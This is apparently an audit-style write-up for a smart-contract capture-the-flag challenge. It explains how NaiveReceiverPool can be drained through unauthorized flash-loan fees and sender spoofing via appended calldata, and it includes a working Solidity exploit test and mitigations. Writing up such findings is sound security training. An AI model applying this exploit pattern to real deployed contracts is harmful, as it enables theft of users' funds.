### [H-1] Missing access control on flashLoan() allows anyone to drain FlashLoanReceiver via fee exhaustion

**Description:** In `NaiveReceiverPool`, the `flashLoan()` function accepts any 
caller-supplied `receiver` address without verifying that the receiver authorized 
the flash loan. Combined with a fixed fee of 1 ETH per loan, any attacker can 
repeatedly trigger flash loans on behalf of the receiver contract, draining its 
entire balance through accumulated fees.

Additionally, the pool's custom `_msgSender()` reads the last 20 bytes of 
`msg.data` as the sender when called through the trusted forwarder. An attacker 
can exploit this by appending an arbitrary address to `withdraw()` calldata, 
spoofing the sender and withdrawing any address's deposit balance.

**Impact:** An attacker can fully drain both the `FlashLoanReceiver` contract 
and the `NaiveReceiverPool` in a single transaction — stealing all funds without 
authorization from either contract.

**Proof of Concept:**
1. Build a multicall array of 10 `flashLoan()` calls targeting the receiver — 
   each call charges 1 ETH fee, draining receiver's 10 ETH balance.
2. Append a `withdraw()` call with deployer's address as the last 20 bytes of 
   calldata — pool reads this as `_msgSender()` and processes the withdrawal 
   from deployer's deposit balance.
3. Wrap the multicall in a `BasicForwarder` request signed by player, execute 
   in one transaction.

<details>
<summary>Example Code Snippet</summary>

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory data = new bytes[](11);

    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSelector(
            pool.flashLoan.selector,
            address(receiver),
            address(weth),
            0,
            ""
        );
    }

    data[10] = abi.encodePacked(
        abi.encodeWithSelector(
            pool.withdraw.selector,
            WETH_IN_POOL + WETH_IN_RECEIVER,
            payable(recovery)
        ),
        deployer
    );

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 1_000_000,
        nonce: forwarder.nonces(player),
        data: abi.encodeWithSelector(pool.multicall.selector, data),
        deadline: block.timestamp + 1 days
    });

    bytes32 digest = keccak256(abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
    ));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    forwarder.execute(request, abi.encodePacked(r, s, v));
}
```
</details>

**Recommended Mitigation:** 
1. Add receiver authorization — only allow flash loans where `msg.sender == receiver` 
   or the receiver has explicitly approved the loan.
2. Harden `_msgSender()` — validate that the appended address in calldata matches 
   the original signer of the forwarder request, preventing arbitrary address spoofing.
3. Add access control to `withdraw()` — verify the caller owns the balance being 
   withdrawn through means that cannot be spoofed via calldata manipulation.